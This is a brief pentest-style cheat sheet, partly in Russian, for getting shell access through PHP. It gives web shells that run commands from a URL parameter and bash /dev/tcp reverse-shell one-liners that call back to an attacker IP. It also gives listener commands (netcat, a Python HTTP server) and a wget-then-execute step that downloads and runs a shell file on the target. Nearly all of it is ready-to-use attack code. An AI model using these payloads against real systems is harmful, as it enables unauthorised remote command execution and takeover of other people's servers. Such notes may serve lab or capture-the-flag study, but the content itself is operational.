https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

1. CMD INJECTION
#Create file:
<?php system($_GET['cmd']); ?>
ИЛИ
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

#url/cmd.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.129.191/9001 0>&1'


2. PHP REVERSE SHELL
#Create file -
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ВАШ_IP/4444 0>&1'"); ?>

#On ATTACKER machine run:
python3 -m http.server 8085
nc -lvnp 4444

#On TARGET machine run:
wget http://192.168.129.191:8085/php.shell -O /tmp/shell.php && php /tmp/shell.php

